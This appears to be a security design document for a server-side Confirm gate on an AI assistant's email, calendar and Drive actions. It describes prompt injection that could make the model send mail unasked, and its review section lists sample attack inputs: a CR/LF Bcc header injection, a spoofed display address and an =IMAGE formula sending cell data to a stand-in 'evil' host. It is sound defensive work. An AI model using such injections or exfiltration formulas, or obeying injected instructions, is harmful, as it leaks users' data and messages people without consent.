# Server-side approval for irreversible actions (audit finding F09)

`send_email`, `reply_email` and `forward_email` used to be guarded by `input.user_confirmed === true`. That value is an
argument **the model supplies**, so it is not evidence that the user agreed to anything (prompt injection in a received
e-mail can make the model set it). `create_calendar_event` with guests had no guard at all: "Confirm first" was only a
sentence in the tool description and the system prompt. On the upstream `d74d883` there are three more ways to reach other
people without any guard: `update_calendar_event` (adds guests and, by default, e-mails everyone on the event),
`delete_calendar_event` (cancels the event for the guests) and `add_file_comment` / `reply_to_file_comment` (Google
notifies everyone with access to the file). Without gating them, "create an event without guests, then add the guest by
update" would have bypassed the gate on `create_calendar_event`. The first version of this branch (HMAC tokens) did not close F09 either: no Confirm UI,
no single use, and `legacy` was the default.

**Nothing here was applied to any live database or deployment.**

## Design

```
model calls send_email / reply_email / forward_email / create_calendar_event (with attendees) /
            update_calendar_event or delete_calendar_event (event has guests, or the edit adds some) /
            add_file_comment / reply_to_file_comment                                              nothing is sent, changed or posted
  -> runTool -> gateIrreversible        stores the exact, normalized arguments in public.approval_requests (service role only)
  -> SSE {status:"approval_required", approval:{id, action, fields, context, expires_at}}
  -> <ApprovalTray> shows a Confirm card: To / Cc / Bcc / Subject / body (or Event / When / Where / Guests / description,
     or the event as Calendar reports it with the guests on it now, or the file name and the comment text)
     as plain text, countdown, Confirm, Cancel
  -> POST /api/approve-action {id, decision}   (Bearer = the signed-in user's Supabase token)
       approve: one atomic  DELETE ... WHERE id AND user_id AND expires_at > now() RETURNING
                -> executes the STORED arguments (never anything from the request) -> Gmail / Google Calendar / Google Drive
       reject : same DELETE, nothing is executed
```

**What is gated.** `send_email`, `reply_email`, `forward_email`, and `create_calendar_event` **when it has at least one guest**. Also:

* `update_calendar_event` and `delete_calendar_event` **when the event has a guest other than the user, or the edit adds guests** (`attendees` or `add_attendees` with at least one address). The gate reads the event from Calendar first (`describeCalendarEvent`): if it cannot be read, nothing happens (fail closed, "the event could not be read"). An event with nobody but the user on it, and an edit that invites nobody, is changed or cancelled immediately as before. The card shows the event as Calendar reported it and the guests on it now, so a newly added guest is visible as new. Normalization keeps an absent field absent ("leave alone") and an empty string as "clear", so an absent `notify` never turns into "do not notify".
* `add_file_comment` and `reply_to_file_comment` **always**: Google notifies everyone with access to the file. The card shows the file name (best effort; the exact file id and text are always shown) and the stored text; a bare resolve shows the `Resolved.` text Drive will post.

Everything else the model can call is classified in `tests/tool-inventory.test.mjs` (see "Tool inventory" below); a new tool fails that test until someone decides whether it reaches a third party.

For `create_calendar_event`, the gate and the executor use the same definition of "guest" (`attendeeEntries()`: an array entry with an address, exactly what `createCalendarEvent()` would send to Google), so an event the executor would invite people to can never slip through as "no guests". An event without guests (only the user) is created immediately as before. Guests are stored as unique, trimmed, lower-case addresses (max 20, validated; objects are reduced to the address, so extra properties such as `organizer` cannot be smuggled in); `start`/`end` must parse. A bad value is refused when the model asks, not after the user pressed Confirm.

| Property | How it holds |
|----------|--------------|
| The model cannot send | In `server` mode (the default) `gateIrreversible` never returns "proceed". `user_confirmed` is ignored. The tool result says `NOT SENT YET`, so the model is told not to claim it was sent. |
| The user approves what is executed | The card shows the stored fields; the endpoint executes the stored row, not request data. A request body carrying `args` changes nothing (tested). A digest recheck (`corrupt`) discards a row altered in the store; unknown fields in a stored row are dropped. |
| Single use / at most once | The row is consumed by the same `DELETE ... RETURNING` that releases it: double click, replay and two tabs give exactly one winner. If Gmail then fails, the request is **not** retried; the user asks again. The UI says so honestly (a network error says "may or may not have been sent: check your Sent folder"). |
| Bound to the user | `user_id` is in the `WHERE`. Another signed-in user gets 404. |
| Short lived, bounded | 10 min TTL, max 10 open requests per user (creations of one user are queued in the process, so parallel tool calls cannot exceed it; several server instances serving one user at the same moment still can, by a few), identical open requests are reused instead of stacked, rows expired for more than 1 h are removed. |
| Not a CSRF target | No CORS headers; authentication is a bearer header, not a cookie. POST only; 30 requests/min/user. |
| Fail closed | No user, no streaming client (the card cannot be shown), card delivery failure, missing table, invalid arguments (including a malformed guest address), unknown `APPROVAL_MODE`: all block with `is_error` and store nothing that could later be released without a card. |
| The card shows what is sent | Every single-line field (recipients, subject, summary, location, ...) is refused if it contains a control character (CR/LF included), a bidi override or an invisible joiner; recipients must be plain ASCII addresses (a display name that contains an address is refused); the MIME encoders also strip line breaks from header values. An independent review found that a subject with `\r\nBcc: ...` used to reach Gmail as a real Bcc header while the card showed an empty Bcc: fixed and covered by end-to-end tests that compare the card with the MIME handed to Gmail. |
| Reply and forward show the real recipients | No card is created unless the received message can be read; the card shows To, Cc (reply-all expansion included) and Bcc computed by the same function the send uses. A `From` header that names several addresses is refused. This relies on the headers of a delivered message not changing between the card and the send (UNVERIFIED against Gmail, believed true). |
| Content is not kept or logged | The row is deleted when the user decides. Audit log lines carry `id`, action and digest only; provider error text is reduced to the HTTP code. |
| No script injection | The body is rendered as text in a `<pre>`; no `innerHTML`. |

## Tool inventory

`tests/tool-inventory.test.mjs` scans every module under `api/lib` for tool definitions and fails on any tool that is not classified:

| Class | Tools | Why |
|---|---|---|
| Gated | `send_email`, `reply_email`, `forward_email`, `create_calendar_event` (guests), `update_calendar_event` / `delete_calendar_event` (guests or new guests), `add_file_comment`, `reply_to_file_comment` | reach other people |
| Read only | `web_search`, `web_fetch`, `search_gmail`, `get_gmail_message`, `list_gmail_labels`, `search_drive`, `read_google_doc`, `search_sheets`, `read_sheet`, `read_sheet_notes`, `read_file_comments`, `list_calendar_events`, `search_outlook`, `search_excel`, `read_drive_file`, `list_drive_folder`, `list_notes`, `recall_memory`, `list_sheet_edits` | nothing is written |
| Own data, reversible | `create_email_draft`, `modify_gmail`, `bulk_archive_gmail`, `create_google_doc`, `append_google_doc`, `create_spreadsheet`, `update_sheet`, `set_sheet_note`, `generate_pdf_document`, `undo_sheet_edit`, `redo_sheet_edit`, `save_memory`, `save_note`, `update_note`, `delete_note` | stays in the user's account; a cell note notifies nobody; the PDF is saved at most into the user's own Drive |

A second check lists the only files that may call the provider helpers that reach people (`sendGmail`, `replyGmail`, `forwardGmail`, `createCalendarEvent`, `updateCalendarEvent`, `deleteCalendarEvent`, `createFileComment`, `replyToFileComment`): `api/lib/claudeTools.js` (once each) and `api/cron/notes-reminders.js` (`sendGmail`, always to the account owner's own address with a fixed template). A new caller anywhere under `api/` fails the test until it is reviewed.

## Configuration

| Variable | Meaning |
|----------|---------|
| `APPROVAL_MODE` unset / `server` | Default. Everything above. |
| `APPROVAL_MODE=legacy` | **Emergency switch only.** The old behaviour: the model's own `user_confirmed === true` releases a mail action, and calendar events, calendar edits and comments are released as before (F09 open). Every release is logged: `[approval] APPROVAL_MODE=legacy ... (F09 open)`. |
| any other value | Blocks every gated action. |

No new secret is needed (the earlier `APPROVAL_SECRET` is gone).

## Evidence

Measured on the port onto upstream `d74d883` (branch `port/pr1-on-d74d883`). Numbers from the PR #1 branch before the port are not repeated here.

* `npm test`: 127 tests, 127 pass (approval store, gate, endpoint, real `runTool` with Gmail, Supabase, Calendar and Drive stubbed at `fetch` level, end-to-end mail tests with the real MIME encoders that compare the card with the message handed to Gmail, end-to-end calendar-edit and comment tests that compare the card with the request Google receives, the **tool inventory** and the call-site inventory, static wiring of chat stream / tool schemas / system prompt / SQL constraint / front end, and a **server-side render of `<ApprovalTray>` for all 8 actions**). No test sends anything. `tsc -b` and `vite build` pass; all 48 `api/` modules import.
* Mutation check on this port: 123 seeded faults (81 carried over or adapted from the PR #1 harness, 42 written for the calendar edits, comments, the card and the port; PR #1 had 82; 10 no longer matched the changed code, 9 of those were rewritten and 1 dropped because a new mutant covers it). 119 caught. **6 of them were first missed** and exposed real test gaps, fixed by new tests: a cancelled event was not rejected by the gate, the stored `notify` of a delete was not checked against what Calendar receives, the failure texts for comments, the 403 explanation, the card UI turning an answer it did not understand into "Cancelled. Nothing was sent.", and a duplicate read of the event. 4 survive and are judged equivalent by reading the code, not proven: `digest ignores action` (field sets differ per action), `no-user check removed` (`createPending` rejects an empty user id first), `invalid args let through` in the gate's second branch (arguments are validated before it), and a `getDriveFileInfo` that throws instead of returning `null` (the throw is inside its own `try`).
* Local PostgreSQL 16.15 with Supabase-like roles (throwaway cluster, **not Supabase**): `approval-requests.sql` applies twice and `verify-approval-requests.sql` returns `0 failing of 20`; the constraint accepts the 8 actions and rejects `trash_email`, `constructor`, `share_file` and the empty string; an **upgrade** from the previous script (3-action constraint, a row in it) keeps the row, rejects `update_calendar_event` before and accepts it after; `anon` and `authenticated` get `permission denied` for select and insert; `GRANT SELECT ... TO PUBLIC` gives `3 failing of 20`; the rollback script drops the table and a re-apply verifies again.
* NOT done on this port: a browser check (layout, colours, clicks, dark mode) of the new cards; the PR #1 browser run (Chromium, 390 px) predates the move to the theme tokens and the new card layout. The new cards were rendered to HTML on the server only, so their text and rows are checked, not their look. No run against real Gmail, Calendar, Drive or Supabase/PostgREST.

## Deployment order

The code fails closed, so the order cannot cause an unintended send, but it decides whether sending works:

1. Backup / point-in-time marker. Confirm which Supabase project the production site really uses (not verified, see below).
2. Run `supabase/approval-requests.sql` (3 s `lock_timeout`; re-run if it aborts on a lock; it also upgrades a table made by an earlier version of the script), then `supabase/verify-approval-requests.sql`: the last row must read `PASS`.
3. Deploy this branch. Smoke test with a test account: ask the assistant to send a mail to yourself, check that **nothing arrives before Confirm**, press Confirm once, check that it arrives once; press Cancel on another; let one expire. Then ask for a calendar event with one test guest you control: **no event and no invitation before Confirm**, one event after it; an event without guests is created at once.

| Situation | Result |
|-----------|--------|
| Code deployed **before** the SQL | Every send/reply/forward is blocked with "the approval store is unavailable (apply supabase/approval-requests.sql)". Nothing is sent, nothing else changes. |
| SQL applied before the code | Harmless: the table is unused. |
| Old front end + new API | The model's call is stored and the SSE event is ignored by the old UI: nothing can be confirmed, nothing is sent. |
| New front end + old API | The old API never emits the event; the tray stays empty. |

## Rollback

* Code: Vercel rollback to the previous deployment. The table can stay.
* `APPROVAL_MODE=legacy` re-opens F09 immediately without a deploy of old code. Use only knowingly, and only for a short time.
* `supabase/approval-requests-rollback.sql` drops the table. With the new code still deployed, sends are then blocked (fail closed).

## Independent review (2026-10-09, of PR #1 before this port)

A reviewer who had not seen this analysis tried to break the guarantee. The core gate held (37 attendee shapes fuzzed with 0 guests created without a card, replay, cross-user, expiry, mode parsing, CSRF, SQL grants read by eye). Findings and what was done:

| Finding | Severity | Status |
|---|---|---|
| Header injection: card shows an empty Bcc, Gmail receives a Bcc header | high | fixed (gate, recipient parsing, encoders), end-to-end tests |
| Reply recipients not pinned or shown when the best-effort lookup failed; reply-all expansion never shown | medium | fixed: no card without the original; card shows the resolved recipients |
| Pending cap bypassed by 40 parallel tool calls | low-medium | fixed in process (queue per user); cross-instance overshoot remains |
| Display spoofing: bidi override, homoglyphs, `"ceo@good.com" <evil@bad>`, hidden tail of a long body | low | fixed: refused/ASCII only; the card states the body length and scrolls |
| Subject required by Gmail but not by the gate (approval burned) | low | fixed |
| "Nothing was sent" shown for 5xx/unreadable answers | low | fixed wording |
| Gate result tested by truthiness; perform calls not awaited | info | fixed (`PROCEED` value, `await`) |
| Tests that would not notice: a hard-coded Bcc in the send branch, a UI that auto-approves, a new ungated `send_draft` tool | test quality | e2e tests, tool inventory and wiring checks added; 20 mutants for these |

Not changed, with reasons:

* `update_sheet` / `create_spreadsheet` write with `USER_ENTERED`, so a formula such as `=IMAGE("https://evil/?d="&A1)` could leak cell data when the owner opens the sheet (reasoned by the reviewer, **not executed**). **Narrowed on the `extras` branch** (`api/lib/sheetSafety.js`, `docs/sheets-formulas.md`): in what the model writes, a cell that calls `IMAGE`, `IMPORTXML`, `IMPORTDATA`, `IMPORTHTML`, `IMPORTFEED`, `IMPORTRANGE` or `HYPERLINK` is sent as text (leading apostrophe); every other formula keeps working, undo/redo still restores the user's own cells unchanged. Whether the real Sheets API stores that cell as text is **UNVERIFIED**. `append_google_doc` can write into a document shared with other people; it stays an immediate reversible own-data write.
* `web_fetch` is a server-side GET; `cron/notes-reminders.js` mails the owner's own address with note text the model can write; `save_memory` lets injected text persist into later system prompts. Not outward-facing in the sense of this gate, but they are prompt-injection surfaces.
* The digest is an unkeyed SHA-256: it detects accidental corruption of a stored row, not an attacker with database write access (who could also change the row).
* `vercel.json` sets no `frame-ancestors`/CSP header (clickjacking of the Confirm button); pending cards used to stay in React state after sign-out (they expire in 10 minutes). On the `extras` branch `src/App.tsx` drops them whenever the signed-in user changes; this is covered by a static wiring check only, not by a browser run.
* Not verified by anyone: live Gmail behaviour with injected headers, browser rendering of the exact attack text, Sheets `IMAGE` exfiltration (before the `extras` change) and the apostrophe handling after it, Anthropic's `web_fetch` URL limits.

## Still open and not covered here

* **MCP servers configured by the user (`mcp_servers`) are executed on Anthropic's side** and never pass through `runTool`, so this gate cannot see them. Whether such a server can send mail, post messages or change calendars depends on the server the user connected. Not covered, not tested.
* The card for an edit or a cancellation shows the guests **at the time the request was made**. If someone else adds a guest during the 10 minutes before Confirm, the stored change is still applied to that event id, and Google notifies everyone then on it. Re-reading the event at Confirm and refusing when the guest list changed would close that; not done.
* When the user is not the organizer and the organizer hid the guest list, Calendar returns only the user as attendee, so the gate sees "nobody else". Whether the user can then edit the event at all depends on the organizer's settings; not verified.
* `modify_gmail` trash (recoverable from Gmail's Trash, nothing leaves the account) and the daily digest cron (sent to the user's own address, composed by the server) do not go through this gate. `bulk_archive_gmail`, `update_sheet`, `append_google_doc` and similar writes are reversible and stay immediate, by design.
* Whether Google's Calendar API e-mails the guests when `sendUpdates` is not set was **not verified** (the documentation says no notification by default, "some emails might still be sent"). Either way the event, with its description, appears for the guests, which is why it needs the Confirm card.
* The 10 minute window is a choice: shorter is safer, longer is friendlier.
* A real end-to-end run (signed in, real Gmail, real Supabase) was not possible here. PostgREST behaviour of `delete().select().maybeSingle()` (one row, `PGRST116` on several) is inferred from its documentation and from the SQL semantics, not run.
* Production mapping and live RLS/policies are unverified (no access), same as in the connector-security PR.
